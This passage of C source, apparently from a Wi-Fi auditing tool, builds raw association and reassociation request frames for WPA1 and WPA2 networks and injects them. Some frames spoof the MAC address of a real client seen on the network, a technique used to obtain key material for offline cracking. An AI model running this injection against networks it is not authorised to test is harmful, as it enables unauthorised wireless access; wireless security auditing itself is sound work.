memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE], &associationrequestwpa2data, ASSOCIATIONREQUESTWPA2_SIZE);
if(((bssidlist +p)->bssidinfo->groupcipher &TCS_CCMP) == TCS_CCMP) packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +0x17] = CS_CCMP;
else packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +0x17] = CS_TKIP;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +0x1d] = CS_CCMP;
if(((bssidlist +p)->bssidinfo->rsnakm &TAK_PSK) == TAK_PSK) packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +0x23] = AK_PSK;
else packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +0x23] = AK_PSKSHA256;
packetoutlen = HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +ASSOCIATIONREQUESTWPA2_SIZE;
fdwrite();
return;
}
/*===========================================================================*/
static inline void send_association_req_wpa2_5(int p)
{
static mac_t *macftx;

static const uint8_t associationrequestcapa[] =
{
0x31, 0x04, 0x05, 0x00
};
#define ASSOCIATIONREQUESTCAPA_SIZE sizeof(associationrequestcapa)

static const uint8_t associationrequestwpa2data[] =
{
/* Tag: Supported Rates 6(B), 9, 12(B), 18, 24(B), 36, 48, 54, [Mbit/sec] */
0x01, 0x08, 0x8c, 0x12, 0x98, 0x24, 0xb0, 0x48, 0x60, 0x6c,
/* RSN information AES PSK (WPA2) */
0x30, 0x14, 0x01, 0x00,
0x00, 0x0f, 0xac, 0x04, /* group cipher */
0x01, 0x00, /* count */
0x00, 0x0f, 0xac, 0x04, /* pairwise cipher */
0x01, 0x00, /* count */
0x00, 0x0f, 0xac, 0x02, /* AKM */
0x80, 0x00,
/* HT capabilites */
0x2d, 0x1a, 0x6e, 0x18, 0x1f, 0xff, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x96,
0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
/* extended capabilites */
0x7f, 0x08, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x40,
/* supported operating classes */
0x3b, 0x14, 0x51, 0x51, 0x53, 0x54, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7a, 0x7b, 0x7c,
0x7d, 0x7e, 0x7f, 0x80, 0x81, 0x82,
/* WMM/WME */
0xdd, 0x07, 0x00, 0x50, 0xf2, 0x02, 0x00, 0x01, 0x00
};
#define ASSOCIATIONREQUESTWPA2_SIZE sizeof(associationrequestwpa2data)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +ASSOCIATIONREQUESTWPA2_SIZE +IETAG_SIZE +(bssidlist +p)->bssidinfo->essidlen);
memcpy(packetoutptr, &hdradiotap_ack, HDRRTACK_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_ASSOC_REQ;
memcpy(macftx->addr1, (bssidlist +p)->mac, 6);
memcpy(macftx->addr2, macrgclient, 6);
memcpy(macftx->addr3, (bssidlist +p)->mac, 6);
macftx->duration = 0x013a;
macftx->sequence = clientsequence++ << 4;
if(clientsequence > 4095) clientsequence = 1;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM], &associationrequestcapa, ASSOCIATIONREQUESTCAPA_SIZE);
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +1] = (bssidlist +p)->bssidinfo->essidlen;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +IETAG_SIZE], (bssidlist +p)->bssidinfo->essid, (bssidlist +p)->bssidinfo->essidlen);
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE], &associationrequestwpa2data, ASSOCIATIONREQUESTWPA2_SIZE);
if(((bssidlist +p)->bssidinfo->groupcipher &TCS_CCMP) == TCS_CCMP) packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +0x11] = CS_CCMP;
else packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +0x11] = CS_TKIP;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +0x17] = CS_CCMP;
if(((bssidlist +p)->bssidinfo->rsnakm &TAK_PSK) == TAK_PSK) packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +0x1d] = AK_PSK;
else packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +0x1d] = AK_PSKSHA256;
packetoutlen = HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +ASSOCIATIONREQUESTWPA2_SIZE;
fdwrite();
return;
}
/*===========================================================================*/
static inline void send_association_req_wpa1_cl(int p)
{
static mac_t *macftx;

static const uint8_t associationrequestcapa[] =
{
0x31, 0x04, 0x05, 0x00
};
#define ASSOCIATIONREQUESTCAPA_SIZE sizeof(associationrequestcapa)

static const uint8_t associationrequestwpa1data[] =
{
/* Tag: Supported Rates 1(B), 2(B), 5.5(B), 11(B), 6(B), 9, 12(B), 18, [Mbit/sec] */
0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x8c, 0x12, 0x98, 0x24,
/* Tag: Extended Supported Rates 24(B), 36, 48, 54, [Mbit/sec] */
0x32, 0x04, 0xb0, 0x48, 0x60, 0x6c,
/* power Capability */
0x21, 0x02, 0x04, 0x14,
/* vendor specific */
0xdd, 0x08, 0xac, 0x85, 0x3d, 0x82, 0x01, 0x00, 0x00, 0x00,
/* WPA information (WPA1) */
0xdd, 0x16, 0x00, 0x50, 0xf2, 0x01, 0x01, 0x00,
0x00, 0x50, 0xf2, 0x04, /* group cipher */
0x01, 0x00, /* count */
0x00, 0x50, 0xf2, 0x04, /* pairwise cipher */
0x01, 0x00, /* count */
0x00, 0x50, 0xf2, 0x02, /* AKM */
};
#define ASSOCIATIONREQUESTWPA1_SIZE sizeof(associationrequestwpa1data)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +ASSOCIATIONREQUESTWPA1_SIZE +IETAG_SIZE +(bssidlist +p)->bssidinfo->essidlen);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_ASSOC_REQ;
memcpy(macftx->addr1, (bssidlist +p)->mac, 6);
memcpy(macftx->addr2, (bssidlist +p)->bssidinfo->macclient, 6);
memcpy(macftx->addr3, (bssidlist +p)->mac, 6);
macftx->duration = 0x013a;
macftx->sequence = clientsequence++ << 4;
if(clientsequence > 4095) clientsequence = 1;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM], &associationrequestcapa, ASSOCIATIONREQUESTCAPA_SIZE);
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +1] = (bssidlist +p)->bssidinfo->essidlen;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +IETAG_SIZE], (bssidlist +p)->bssidinfo->essid, (bssidlist +p)->bssidinfo->essidlen);
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE], &associationrequestwpa1data, ASSOCIATIONREQUESTWPA1_SIZE);
if(((bssidlist +p)->bssidinfo->groupcipher &TCS_CCMP) == TCS_CCMP) packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +0x29] = CS_CCMP;
else packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +0x29] = CS_TKIP;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +0x2f] = CS_TKIP;
if(((bssidlist +p)->bssidinfo->wpaakm &TAK_PSK) == TAK_PSK) packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +0x35] = AK_PSK;
packetoutlen = HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +ASSOCIATIONREQUESTWPA1_SIZE;
fdwrite();
return;
}
/*===========================================================================*/
static inline void send_association_req_wpa1_cl_5(int p)
{
static mac_t *macftx;

static const uint8_t associationrequestcapa[] =
{
0x31, 0x04, 0x05, 0x00
};
#define ASSOCIATIONREQUESTCAPA_SIZE sizeof(associationrequestcapa)

static const uint8_t associationrequestwpa1data[] =
{
/* Tag: Supported Rates 6(B), 9, 12(B), 18, 24(B), 36, 48, 54, [Mbit/sec] */
0x01, 0x08, 0x8c, 0x12, 0x98, 0x24, 0xb0, 0x48, 0x60, 0x6c,
/* power Capability */
0x21, 0x02, 0x04, 0x14,
/* vendor specific */
0xdd, 0x08, 0xac, 0x85, 0x3d, 0x82, 0x01, 0x00, 0x00, 0x00,
/* WPA information (WPA1) */
0xdd, 0x16, 0x00, 0x50, 0xf2, 0x01, 0x01, 0x00,
0x00, 0x50, 0xf2, 0x04, /* group cipher */
0x01, 0x00, /* count */
0x00, 0x50, 0xf2, 0x04, /* pairwise cipher */
0x01, 0x00, /* count */
0x00, 0x50, 0xf2, 0x02, /* AKM */
};
#define ASSOCIATIONREQUESTWPA1_SIZE sizeof(associationrequestwpa1data)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +ASSOCIATIONREQUESTWPA1_SIZE +IETAG_SIZE +(bssidlist +p)->bssidinfo->essidlen);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_ASSOC_REQ;
memcpy(macftx->addr1, (bssidlist +p)->mac, 6);
memcpy(macftx->addr2, (bssidlist +p)->bssidinfo->macclient, 6);
memcpy(macftx->addr3, (bssidlist +p)->mac, 6);
macftx->duration = 0x013a;
macftx->sequence = clientsequence++ << 4;
if(clientsequence > 4095) clientsequence = 1;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM], &associationrequestcapa, ASSOCIATIONREQUESTCAPA_SIZE);
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +1] = (bssidlist +p)->bssidinfo->essidlen;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +IETAG_SIZE], (bssidlist +p)->bssidinfo->essid, (bssidlist +p)->bssidinfo->essidlen);
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE], &associationrequestwpa1data, ASSOCIATIONREQUESTWPA1_SIZE);
if(((bssidlist +p)->bssidinfo->groupcipher &TCS_CCMP) == TCS_CCMP) packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +0x23] = CS_CCMP;
else packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +0x23] = CS_TKIP;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +0x28] = CS_TKIP;
if(((bssidlist +p)->bssidinfo->wpaakm &TAK_PSK) == TAK_PSK) packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +0x2f] = AK_PSK;
packetoutlen = HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +ASSOCIATIONREQUESTWPA1_SIZE;
fdwrite();
return;
}
/*===========================================================================*/
static inline void send_reassociation_req_wpa1(int p)
{
static mac_t *macftx;
static capreqsta_t *stacapa;

static const uint8_t reassociationrequestwpa1data[] =
{
/* Tag: Supported Rates 1(B), 2(B), 5.5(B), 11(B), 6(B), 9, 12(B), 18, [Mbit/sec] */
0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x8c, 0x12, 0x98, 0x24,
/* Tag: Extended Supported Rates 24(B), 36, 48, 54, [Mbit/sec] */
0x32, 0x04, 0xb0, 0x48, 0x60, 0x6c,
/* power Capability */
0x21, 0x02, 0x04, 0x14,
/* vendor specific */
0xdd, 0x08, 0xac, 0x85, 0x3d, 0x82, 0x01, 0x00, 0x00, 0x00,
/* WPA information (WPA1) */
0xdd, 0x16, 0x00, 0x50, 0xf2, 0x01, 0x01, 0x00,
0x00, 0x50, 0xf2, 0x04, /* group cipher */
0x01, 0x00, /* count */
0x00, 0x50, 0xf2, 0x04, /* pairwise cipher */
0x01, 0x00, /* count */
0x00, 0x50, 0xf2, 0x02, /* AKM */
};
#define REASSOCIATIONREQUESTWPA1_SIZE sizeof(reassociationrequestwpa1data)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +REASSOCIATIONREQUESTWPA1_SIZE +IETAG_SIZE +(bssidlist +p)->bssidinfo->essidlen);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_REASSOC_REQ;
memcpy(macftx->addr1, (bssidlist +p)->mac, 6);
memcpy(macftx->addr2, (bssidlist +p)->bssidinfo->macclient, 6);
memcpy(macftx->addr3, (bssidlist +p)->mac, 6);
macftx->duration = 0x013a;
macftx->sequence = clientsequence++ << 4;
if(clientsequence > 4095) clientsequence = 1;
stacapa = (capreqsta_t *) (packetoutptr +HDRRT_SIZE +MAC_SIZE_NORM);
stacapa->capabilities = 0x0411;
stacapa->listeninterval = 3;
memcpy(stacapa->addr, (bssidlist +p)->mac, 6);
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +1] =(bssidlist +p)->bssidinfo->essidlen;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +IETAG_SIZE], (bssidlist +p)->bssidinfo->essid, (bssidlist +p)->bssidinfo->essidlen);
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE], &reassociationrequestwpa1data, REASSOCIATIONREQUESTWPA1_SIZE);
if(((bssidlist +p)->bssidinfo->groupcipher &TCS_CCMP) == TCS_CCMP) packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +0x29] = CS_CCMP;
else packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +0x29] = CS_TKIP;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +0x2f] = CS_TKIP;
if(((bssidlist +p)->bssidinfo->wpaakm &TAK_PSK) == TAK_PSK) packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +0x35] = AK_PSK;
packetoutlen = HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +REASSOCIATIONREQUESTWPA1_SIZE;
packetoutlen = HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +REASSOCIATIONREQUESTWPA1_SIZE;
fdwrite();
return;
}
/*===========================================================================*/
static inline void send_reassociation_req_wpa1_5(int p)
{
static mac_t *macftx;
static capreqsta_t *stacapa;

static const uint8_t reassociationrequestwpa1data[] =
{
/* Tag: Supported Rates 6(B), 9, 12(B), 18, 24(B), 36, 48, 54, [Mbit/sec] */
0x01, 0x08, 0x8c, 0x12, 0x98, 0x24, 0xb0, 0x48, 0x60, 0x6c,
/* power Capability */
0x21, 0x02, 0x04, 0x14,
/* vendor specific */
0xdd, 0x08, 0xac, 0x85, 0x3d, 0x82, 0x01, 0x00, 0x00, 0x00,
/* WPA information (WPA1) */
0xdd, 0x16, 0x00, 0x50, 0xf2, 0x01, 0x01, 0x00,
0x00, 0x50, 0xf2, 0x04, /* group cipher */
0x01, 0x00, /* count */
0x00, 0x50, 0xf2, 0x04, /* pairwise cipher */
0x01, 0x00, /* count */
0x00, 0x50, 0xf2, 0x02, /* AKM */
};
#define REASSOCIATIONREQUESTWPA1_SIZE sizeof(reassociationrequestwpa1data)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +REASSOCIATIONREQUESTWPA1_SIZE +IETAG_SIZE +(bssidlist +p)->bssidinfo->essidlen);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_REASSOC_REQ;
memcpy(macftx->addr1, (bssidlist +p)->mac, 6);
memcpy(macftx->addr2, (bssidlist +p)->bssidinfo->macclient, 6);
memcpy(macftx->addr3, (bssidlist +p)->mac, 6);
macftx->duration = 0x013a;
macftx->sequence = clientsequence++ << 4;
if(clientsequence > 4095) clientsequence = 1;
stacapa = (capreqsta_t *) (packetoutptr +HDRRT_SIZE +MAC_SIZE_NORM);
stacapa->capabilities = 0x0411;
stacapa->listeninterval = 3;
memcpy(stacapa->addr, (bssidlist +p)->mac, 6);
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +1] =(bssidlist +p)->bssidinfo->essidlen;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +IETAG_SIZE], (bssidlist +p)->bssidinfo->essid, (bssidlist +p)->bssidinfo->essidlen);
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE], &reassociationrequestwpa1data, REASSOCIATIONREQUESTWPA1_SIZE);
if(((bssidlist +p)->bssidinfo->groupcipher &TCS_CCMP) == TCS_CCMP) packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +0x23] = CS_CCMP;
else packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +0x23] = CS_TKIP;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +0x29] = CS_TKIP;
if(((bssidlist +p)->bssidinfo->wpaakm &TAK_PSK) == TAK_PSK) packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +0x2f] = AK_PSK;
packetoutlen = HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +REASSOCIATIONREQUESTWPA1_SIZE;
packetoutlen = HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +REASSOCIATIONREQUESTWPA1_SIZE;
fdwrite();
return;
}
/*===========================================================================*/
static inline void send_reassociation_req_wpa2(int p)
{
static mac_t *macftx;
static capreqsta_t *stacapa;

static const uint8_t reassociationrequestwpa2data[] =
{
/* Tag: Supported Rates 1(B), 2(B), 5.5(B), 11(B), 6(B), 9, 12(B), 18, [Mbit/sec] */
0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x8c, 0x12, 0x98, 0x24,
/* Tag: Extended Supported Rates 24(B), 36, 48, 54, [Mbit/sec] */
0x32, 0x04, 0xb0, 0x48, 0x60, 0x6c,
/* power Capability */
0x21, 0x02, 0x04, 0x14,
/* vendor specific */
0xdd, 0x08, 0xac, 0x85, 0x3d, 0x82, 0x01, 0x00, 0x00, 0x00,
/* RSN information AES PSK (WPA2) */
0x30, 0x14, 0x01, 0x00,
0x00, 0x0f, 0xac, 0x04, /* group cipher */
0x01, 0x00, /* count */
0x00, 0x0f, 0xac, 0x04, /* pairwise cipher */
0x01, 0x00, /* count */
0x00, 0x0f, 0xac, 0x02, /* AKM */
0x80, 0x00,
};
#define REASSOCIATIONREQUESTWPA2_SIZE sizeof(reassociationrequestwpa2data)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +REASSOCIATIONREQUESTWPA2_SIZE +IETAG_SIZE +(bssidlist +p)->bssidinfo->essidlen);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_REASSOC_REQ;
memcpy(macftx->addr1, (bssidlist +p)->mac, 6);
memcpy(macftx->addr2, (bssidlist +p)->bssidinfo->macclient, 6);
memcpy(macftx->addr3, (bssidlist +p)->mac, 6);
macftx->duration = 0x013a;
macftx->sequence = clientsequence++ << 4;
if(clientsequence > 4095) clientsequence = 1;
stacapa = (capreqsta_t *) (packetoutptr +HDRRT_SIZE +MAC_SIZE_NORM);
stacapa->capabilities = 0x0411;
stacapa->listeninterval = 3;
memcpy(stacapa->addr, (bssidlist +p)->mac, 6);
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +1] = (bssidlist +p)->bssidinfo->essidlen;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +IETAG_SIZE], (bssidlist +p)->bssidinfo->essid, (bssidlist +p)->bssidinfo->essidlen);
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE], &reassociationrequestwpa2data, REASSOCIATIONREQUESTWPA2_SIZE);
if(((bssidlist +p)->bssidinfo->groupcipher &TCS_CCMP) == TCS_CCMP) packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +0x25] = CS_CCMP;
else packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +0x25] = CS_TKIP;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +0x2b] = CS_CCMP;
if(((bssidlist +p)->bssidinfo->rsnakm &TAK_PSK) == TAK_PSK) packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +0x31] = AK_PSK;
else packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +0x31] = AK_PSKSHA256;
packetoutlen = HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +REASSOCIATIONREQUESTWPA2_SIZE;
fdwrite();
return;
}
/*===========================================================================*/
static inline void send_reassociation_req_wpa2_5(int p)
{
static mac_t *macftx;
static capreqsta_t *stacapa;

static const uint8_t reassociationrequestwpa2data[] =
{
/* Tag: Supported Rates 6(B), 9, 12(B), 18, 24(B), 36, 48, 54, [Mbit/sec] */
0x01, 0x08, 0x8c, 0x12, 0x98, 0x24, 0xb0, 0x48, 0x60, 0x6c,
/* power Capability */
0x21, 0x02, 0x04, 0x14,
/* vendor specific */
0xdd, 0x08, 0xac, 0x85, 0x3d, 0x82, 0x01, 0x00, 0x00, 0x00,
/* RSN information AES PSK (WPA2) */
0x30, 0x14, 0x01, 0x00,
0x00, 0x0f, 0xac, 0x04, /* group cipher */
0x01, 0x00, /* count */
0x00, 0x0f, 0xac, 0x04, /* pairwise cipher */
0x01, 0x00, /* count */
0x00, 0x0f, 0xac, 0x02, /* AKM */
0x80, 0x00,
};
#define REASSOCIATIONREQUESTWPA2_SIZE sizeof(reassociationrequestwpa2data)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +REASSOCIATIONREQUESTWPA2_SIZE +IETAG_SIZE +(bssidlist +p)->bssidinfo->essidlen);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_REASSOC_REQ;
memcpy(macftx->addr1, (bssidlist +p)->mac, 6);
memcpy(macftx->addr2, (bssidlist +p)->bssidinfo->macclient, 6);
memcpy(macftx->addr3, (bssidlist +p)->mac, 6);
macftx->duration = 0x013a;
macftx->sequence = clientsequence++ << 4;
if(clientsequence > 4095) clientsequence = 1;
stacapa = (capreqsta_t *) (packetoutptr +HDRRT_SIZE +MAC_SIZE_NORM);
stacapa->capabilities = 0x0411;
stacapa->listeninterval = 3;
memcpy(stacapa->addr, (bssidlist +p)->mac, 6);
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +1] = (bssidlist +p)->bssidinfo->essidlen;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +IETAG_SIZE], (bssidlist +p)->bssidinfo->essid, (bssidlist +p)->bssidinfo->essidlen);
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE], &reassociationrequestwpa2data, REASSOCIATIONREQUESTWPA2_SIZE);
if(((bssidlist +p)->bssidinfo->groupcipher &TCS_CCMP) == TCS_CCMP) packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +0x1f] = CS_CCMP;
